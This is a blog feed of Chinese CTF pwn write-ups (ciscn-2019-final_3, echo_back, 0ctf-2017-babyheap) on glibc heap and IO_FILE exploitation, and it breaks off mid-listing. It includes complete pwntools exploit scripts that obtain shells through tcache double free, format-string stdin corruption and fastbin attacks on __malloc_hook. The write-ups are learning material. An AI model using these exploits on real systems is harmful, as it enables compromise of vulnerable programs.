<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ciscn-2019-final_3——初探Tcache</title>
      <link href="/2020/08/17/ciscn-2019-final-3%E2%80%94%E2%80%94%E5%88%9D%E6%8E%A2Tcache/"/>
      <url>/2020/08/17/ciscn-2019-final-3%E2%80%94%E2%80%94%E5%88%9D%E6%8E%A2Tcache/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近要开始备战省赛国赛了，前段时间蓝帽杯的成绩很不理想，自己还是太菜了。乘这段假期多提升一下自<br>己吧。</p><a id="more"></a><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先简单分析一下程序，发现是一个64位程序，保护全开</p><p><img src="/img/final_3/1.jpg" alt="avatar"></p><p>放进ida分析，发现是一个功能比较简单的cpp程序，只有add和free功能</p><p><img src="/img/final_3/2.jpg" alt="avatar"></p><p>在add功能中我们可以发现，程序最多允许创建0x18个chunk，chunk最大为0x78。同时，每一个chunk在<br>被创建的过程中，其地址都会被打印出来，所以我们只能利用这个地方来泄露我们需要的地址。</p><p><img src="/img/final_3/3.jpg" alt="avatar"></p><p>free功能里由于没有清空指针，则存在uaf漏洞</p><p>由于本程序所使用的的环境是libc-2.27，所以存在tcache机制，所以我们利用的主要思路就是通过<br>tcache的double free机制来控制指针，来构造出unsorted bin，并且分配到libc上的地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">exec_file = &apos;./pwn&apos;</span><br><span class="line">argv=[&quot;/home/aidmong/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;,&quot;--library-path&quot;,&quot;//home/aidmong/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/&quot;,exec_file]</span><br><span class="line">p=process(argv=argv)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx,size,content):</span><br><span class="line">p.sendlineafter(&apos;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">p.sendlineafter(&apos;index\n&apos;,str(idx))</span><br><span class="line">p.sendlineafter(&apos;\n&apos;,str(size))</span><br><span class="line">p.sendlineafter(&apos;\n&apos;,content)</span><br><span class="line">p.recvuntil(&apos;gift :&apos;)</span><br><span class="line">gift = int(p.recv(14),16)</span><br><span class="line">log.info(&apos;chunk&apos;+str(idx)+&apos;:&apos;+hex(gift))</span><br><span class="line">return gift</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">p.sendlineafter(&apos; &gt; &apos;,&apos;2&apos;)</span><br><span class="line">p.sendlineafter(&apos;\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">heap0 = add(0,0x78,&apos;aaaa&apos;)</span><br><span class="line">heap1 = add(1,0x18,&apos;bbbb&apos;)</span><br><span class="line">tcache = heap0-0x11e60</span><br><span class="line">add(2,0x78,&apos;bbbb&apos;)</span><br><span class="line">add(3,0x78,&apos;bbbb&apos;)</span><br><span class="line">add(4,0x78,&apos;bbbb&apos;)</span><br><span class="line">add(5,0x78,&apos;bbbb&apos;)</span><br><span class="line">add(6,0x78,&apos;bbbb&apos;)</span><br><span class="line">add(7,0x78,&apos;bbbb&apos;)</span><br><span class="line">add(8,0x78,&apos;bbbb&apos;)</span><br><span class="line">add(9,0x78,&apos;&apos;)</span><br><span class="line">add(10,0x78,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(11,0x28,&apos;&apos;)</span><br><span class="line">delete(11)  </span><br><span class="line">delete(11)   #double free</span><br><span class="line">add(12,0x28,p64(heap0-0x10))</span><br><span class="line">add(13,0x28,p64(heap0-0x10))</span><br><span class="line">add(14,0x28,p64(0)+p64(0x421))    #overflow chunk size</span><br><span class="line">delete(0)                         #get unsorted bin</span><br><span class="line">delete(1)                         #put into tcache</span><br><span class="line">add(15,0x78,&apos;&apos;)                   #cut unsorted bin</span><br><span class="line">add(16,0x18,&apos;&apos;)  </span><br><span class="line">malloc_hook = add(18,0x18,&apos;&apos;)-0x70</span><br><span class="line">libc_base = malloc_hook - libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">one = libc_base + 0x10a38c</span><br><span class="line">delete(5)</span><br><span class="line">delete(5)</span><br><span class="line">add(19,0x78,p64(malloc_hook))</span><br><span class="line">add(20,0x78,p64(malloc_hook))</span><br><span class="line">add(21,0x78,p64(one))</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-echo_back-IO_FILE结构体初探</title>
      <link href="/2020/05/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-echo-back-IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%9D%E6%8E%A2/"/>
      <url>/2020/05/29/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-echo-back-IO-FILE%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在攻防世界里刷到了echo_back这道题，本来以为这可能是一道格式化字符串的题，但是研究之后发现只能输入7个字符，所以传统的格式化<br>字符串漏洞就无法进行利用。在看了其他大师傅的wp之后才知道了要对IO_FILE_stdin结构体指针进行攻击，所以学习之后在这里做一个记录。</p><a id="more"></a><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/img/echo_back/2.jpg" alt="avatar"><br>checksec发现这是一个64位保护全开的程序，就有点头痛。</p><p><img src="/img/echo_back/1.jpg" alt="avatar"></p><p><img src="/img/echo_back/3.jpg" alt="avatar"><br>ida反编译后发现程序的逻辑还是比较简单的，大致上只有两个功能，一个是输入name，一个就是格式化字符串所在的echo_back函数、</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于能够重复输入，我们首先就能够利用格式化字符串漏洞来泄露libc地址和程序基址，这里就不进行赘述了。经过我们的调试，我们可以使用<br><em>%19$p*来泄露出Libc_start_main+240的地址，然后就能够计算出我们所需要的libc地址了。同样的，我们可以利用</em>%13$p*来泄露程序基址，<br>但其实在这道题目中并不需要知道程序基址。</p><p>在泄露了libc地址之后，我们本能的就会想到利用格式化字符串漏洞修改返回地址为one_gadget来拿到shell。这里我们通过泄露rbp内容来获取<br>main_ret的地址。我们只需要输入<em>%12$p</em>就能够得到rbp地址，然后+8就是ret地址了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#show libc_addr</span><br><span class="line">echo(&apos;%19$p&apos;)</span><br><span class="line">p.recvuntil(&apos;say:&apos;)</span><br><span class="line">libc_start_main = int(p.recv(14),16)-240</span><br><span class="line">libc_base = libc_start_main - libc.sym[&apos;__libc_start_main&apos;]</span><br><span class="line">system = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">binsh = libc_base + libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">pop_rdi = libc_base + 0x21102</span><br><span class="line">stdin = libc_base + libc.sym[&apos;_IO_2_1_stdin_&apos;]</span><br><span class="line">buf_base = stdin + 0x8*7</span><br><span class="line">#show main_addr</span><br><span class="line">echo(&apos;%13$p&apos;)</span><br><span class="line">p.recvuntil(&apos;say:&apos;)</span><br><span class="line">main_addr = int(p.recv(14),16)-0x9c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># get addr store return addr of main</span><br><span class="line">echo(&apos;%12$p&apos;)</span><br><span class="line">p.recvuntil(&apos;say:&apos;)</span><br><span class="line">main_rbp = int(p.recv(14),16)</span><br><span class="line">main_ret = main_rbp+8</span><br></pre></td></tr></table></figure><p>但是由于题目限制了输入的长度，所以我们直接修改ret地址是做不到的。这里就需要利用到setname这个函数了。当我们输入了name后，发现<br>第16个参数就是我们输入的name，所以我们可以先setname(p64(main_ret)),然后利用格式化字符串修改返回地址。但是无论怎么构建payload<br>长度都是不够的，所以这里就要用到新的知识了，那就是直接攻击scanf函数内部，然后直接利用scanf函数往目标地址处写我们的数据。</p><p>经过了解我们知道scanf是通过stdin来读取数据的，那么如果我们能够修改stdin的数据，就能够实现任意地址的读写了。而实际上stdin是一个<br>IO_FILE结构体指针，所以我们先来了解一下FILE结构体指针吧。<br>下面是有关IO_FILE结构体定义的源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_wide_data</span><br><span class="line">&#123;</span><br><span class="line">  wchar_t *_IO_read_ptr;/* Current read pointer */</span><br><span class="line">  wchar_t *_IO_read_end;/* End of get area. */</span><br><span class="line">  wchar_t *_IO_read_base;/* Start of putback+get area. */</span><br><span class="line">  wchar_t *_IO_write_base;/* Start of put area. */</span><br><span class="line">  wchar_t *_IO_write_ptr;/* Current put pointer. */</span><br><span class="line">  wchar_t *_IO_write_end;/* End of put area. */</span><br><span class="line">  wchar_t *_IO_buf_base;/* Start of reserve area. */</span><br><span class="line">  wchar_t *_IO_buf_end;/* End of reserve area. */</span><br><span class="line">  /* The following fields are used to support backing up and undo. */</span><br><span class="line">  wchar_t *_IO_save_base;/* Pointer to start of non-current get area. */</span><br><span class="line">  wchar_t *_IO_backup_base;/* Pointer to first valid character of</span><br><span class="line">   backup area */</span><br><span class="line">  wchar_t *_IO_save_end;/* Pointer to end of non-current get area. */</span><br><span class="line"></span><br><span class="line">  __mbstate_t _IO_state;</span><br><span class="line">  __mbstate_t _IO_last_state;</span><br><span class="line">  struct _IO_codecvt _codecvt;</span><br><span class="line"></span><br><span class="line">  wchar_t _shortbuf[1];</span><br><span class="line"></span><br><span class="line">  const struct _IO_jump_t *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在知道了初步FILE结构体之后，我们就要看最重要的_IO_new_file_underflow函数了。这和函数再libio-&gt;fileops.c中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">int _IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  ...</span><br><span class="line">  if (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      return EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  ## 如果输入缓冲区里存在数据，则直接返回</span><br><span class="line">  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  ...</span><br><span class="line">  if (fp-&gt;_IO_buf_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line">  ##调用_IO_SYSREAD函数最终执行系统调用读取数据</span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  ...</span><br><span class="line">  ## 设置结构体指针</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  ...</span><br><span class="line">  return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</span><br></pre></td></tr></table></figure><p>在这个函数中，程序首先会进行一定的处理。然后会判断如果fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end，那么直接返回_IO_read_ptr<br>否则，函数就会调用_IO_SYSREAD来读取数据，并且读取的长度是fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base。所以只要我们能够修改这两个<br>地址的值，我们就能够实现任意地址读写。</p><p>在学习了这些前置知识之后，我们就可以开始具体的程序利用了。<br>我们首先查看一下程序中stdin结构体的情况<br><img src="/img/echo_back/4.jpg" alt="avatar"><br>我们发现_IO_buf_base和_IO_buf_end是stdin中的第8,9个参数，所以_IO_2_1_stdin+7*8就是buf_base。<br>经过调试我们发现_IO_buf_base中存的值为0x7ffff7dd1963,而_IO_2_1_stdin_的地址为0x7ffff7dd18e0，从而计算出_IO_buf_base的地<br>址为0x7ffff7dd1918。那么当我们利用格式化字符串漏洞修改buf_base中的值的最后两位为\x00后，存的值正好就是IO_write_base的地址。<br>所以我们先读取0x18个字节之后，我们就能覆盖到_IO_buf_base和_IO_buf_end了。这里我们需要注意的就是记得把前面的值恢复原样，也就是<br>IO_2_1_stdin+0x83。之后在buf_base和buf_end分别写入main_ret和main_ret+0x18,我们就能写入ROP链了</p><p>但是在测试之后发现我们直接写入ROP链是不可行的，这是因为我们还需要绕过一个判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">   return *(unsigned char *) fp-&gt;_IO_read_ptr;</span><br></pre></td></tr></table></figure><p>由于我们前面执行时，执行了<em>fp-&gt;_IO_read_end += count = len(payload)</em>，并且getchar的作用就是使_IO_read_end+1,所以还需要执<br>行len(payload)-1次getchar，我们才能够进行正常的ROP</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">e = ELF(&apos;./pwn&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line">def setname(name):</span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">p.sendlineafter(&apos;name:&apos;,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def echo(payload):</span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">p.sendlineafter(&apos;:&apos;,&apos;7&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">#show libc_addr</span><br><span class="line">echo(&apos;%19$p&apos;)</span><br><span class="line">p.recvuntil(&apos;say:&apos;)</span><br><span class="line">libc_start_main = int(p.recv(14),16)-240</span><br><span class="line">libc_base = libc_start_main - libc.sym[&apos;__libc_start_main&apos;]</span><br><span class="line">system = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">binsh = libc_base + libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">pop_rdi = libc_base + 0x21102</span><br><span class="line">stdin = libc_base + libc.sym[&apos;_IO_2_1_stdin_&apos;]</span><br><span class="line">buf_base = stdin + 0x8*7</span><br><span class="line">#show main_addr</span><br><span class="line">echo(&apos;%13$p&apos;)</span><br><span class="line">p.recvuntil(&apos;say:&apos;)</span><br><span class="line">main_addr = int(p.recv(14),16)-0x9c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># get addr store return addr of main</span><br><span class="line">echo(&apos;%12$p&apos;)</span><br><span class="line">p.recvuntil(&apos;say:&apos;)</span><br><span class="line">main_rbp = int(p.recv(14),16)</span><br><span class="line">main_ret = main_rbp+8</span><br><span class="line"></span><br><span class="line">setname(p64(buf_base))</span><br><span class="line">echo(&apos;%16$hhn&apos;)</span><br><span class="line">payload = p64(0x83 + stdin)*3 + p64(main_ret) + p64(main_ret + 0x8 * 3)  </span><br><span class="line">p.sendlineafter(&apos;choice&gt;&gt;&apos;,&apos;2&apos;)  </span><br><span class="line">p.sendafter(&apos;length:&apos;,payload)  </span><br><span class="line">p.sendline(&apos;&apos;)  </span><br><span class="line">#不断调用getchar()使fp-&gt;_IO_read_ptr与使fp-&gt;_IO_read_end相等  </span><br><span class="line">for i in range(0,len(payload)-1):  </span><br><span class="line">p.sendlineafter(&apos;choice&gt;&gt;&apos;,&apos;2&apos;)  </span><br><span class="line">p.sendlineafter(&apos;length:&apos;,&apos;&apos;)  </span><br><span class="line"></span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;2&apos;)</span><br><span class="line">payload = p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendlineafter(&apos;:&apos;,payload)</span><br><span class="line">p.sendline(&apos;&apos;)</span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;3&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0ctf-2017-babyheap</title>
      <link href="/2020/03/20/0ctf-2017-babyheap/"/>
      <url>/2020/03/20/0ctf-2017-babyheap/</url>
      
        <content type="html"><![CDATA[<p>pwn真的是太有趣了，让人上头哈哈哈。这道题也是一道堆利用的基础题。记录一下自己的学习过程，也是总结一下这类题目的解题思路以及基本<br>套路。</p><a id="more"></a><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/aidmong/Desktop/ctf/pwn/buuctf/babyheap/babyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>分析发现程序的保护全开，实在是让人头痛。这样的话我们肯定是要泄露地址，同时由于不能修改got表，那我们可能还要修改malloc_hook</p><p>ida反汇编后发现是一道比较常见的菜单题<br>创建没什么好说的，就是输入我们需要的chunk大小，利用calloc函数来创建，最后把chunk是否使用，chunk的大小和堆地址存储在一个全局<br>变量中。这里唯一需要注意的就是由于本题使用的是calloc函数，因此在申请地址的时候会把原地址的内容给清除，这会给我们的利用带来一定<br>的麻烦。<br><img src="/img/0ctf-babyheap/1.jpg" alt="avatar"><br>编辑函数就是我们本题的漏洞所在了，由于并没有对编辑的size进行检查，因此这里就有了一个堆溢出的漏洞<br>至于delete和show也没啥好多说的，就是不断构造chunk来泄露地址以及拿到需要的shell</p><h2 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h2><p>我们首先利用堆溢出伪造一个size覆盖了下一个chunk的chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create(0x20)</span><br><span class="line">create(0x20)</span><br><span class="line">create(0x100)</span><br><span class="line">create(0x20)</span><br><span class="line">payload = &apos;a&apos;*0x20+p64(0)+p64(0x141)</span><br><span class="line">edit(0,len(payload),payload)</span><br></pre></td></tr></table></figure><p>这时我们的堆结构已经被我们修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">x/40gx 0x562182141000</span><br><span class="line">0x562182141000:0x00000000000000000x0000000000000031  ==&gt;chunk0</span><br><span class="line">0x562182141010:0x61616161616161610x6161616161616161</span><br><span class="line">0x562182141020:0x61616161616161610x6161616161616161</span><br><span class="line">0x562182141030:0x00000000000000000x0000000000000141  ==&gt;chunk1</span><br><span class="line">0x562182141040:0x00000000000000000x0000000000000000</span><br><span class="line">0x562182141050:0x00000000000000000x0000000000000000</span><br><span class="line">0x562182141060:0x00000000000000000x0000000000000111  ==&gt;chunk2</span><br><span class="line">0x562182141070:0x00000000000000000x0000000000000000</span><br><span class="line">0x562182141080:0x00000000000000000x0000000000000000</span><br><span class="line">0x562182141090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5621821410a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5621821410b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5621821410c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5621821410d0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>接下来我们先删除chunk1，由于chunk1的大小属于unsorted bin的范围，所以chunk1会被加入双向链表。这样其实我们保存<br>chunk地址的全局变量ptr中的chunk1信息已经被清空了。然后我们再次创建一个大小为0x130的chunk，并且再次伪造出原先的chunk2。这<br>样当我们show(1)时，我们就能够直接泄露到chunk2了。然后我们只需要释放chunk2，chunk2也会被加入链表，同时根据libc的机制，chunk2<br>的fd 和bk都会存储libc_main_arena的地址。之后我们就能利用show(1)来连带着泄露出libc地址。这就是做题时常常会使用到的heap<br>overlapping了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br><span class="line">create(0x130)</span><br><span class="line">payload = &apos;\x00&apos;*0x20+p64(0)+p64(0x111)</span><br><span class="line">edit(1,len(payload),payload)</span><br><span class="line">delete(2)</span><br><span class="line">show(1)</span><br><span class="line">p.recv(0x3a)</span><br><span class="line">libc_main_arena = u64(p.recv(6).ljust(8,&apos;\x00&apos;))-88</span><br><span class="line">#obj = LibcSearcher(&apos;main_arena&apos;,libc_main_arena)</span><br><span class="line">libc_base = libc_main_arena - offset</span><br><span class="line">shell = libc_base + 0x4526a</span><br></pre></td></tr></table></figure><p>接下里我们需要做的就是劫持malloc_hook了，我们都知道malloc_hook的地址是在libc_main_arena的上方。这里我们选择劫持比较常见<br>的main_arena-0x33这个地址，因为这里可以被作为一个合理的fakechunk，只要申请到这个地址，我们就能够对malloc_hook进行修改。<br>同样的我们就能够想到由于libc在申请chunk的时候首先会检查bin里面有没有合适大小的chunk，我们可以尝试修改fastbin这个链表，来申请<br>出我们所需要的chunk。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(0x60)</span><br><span class="line">delete(2)</span><br><span class="line">payload = &apos;a&apos;*0x20+p64(0)+p64(0x71)+p64(fake_addr)</span><br><span class="line">edit(1,len(payload),payload)</span><br></pre></td></tr></table></figure><p>在这样的修改之后，我们再去查看堆布局就会发现chunk2的fd就会变我们伪造的chunk地址，同时fastbin中也被加入了这个地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x556579e09060 —▸ 0x7f557744daed (_IO_wide_data_0+301) ◂— 0x557710ee20000000</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>那么当我们申请两次之后，申请到的就是fake_addr，然后在里面填充one_gadgets就能拿到shell了</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 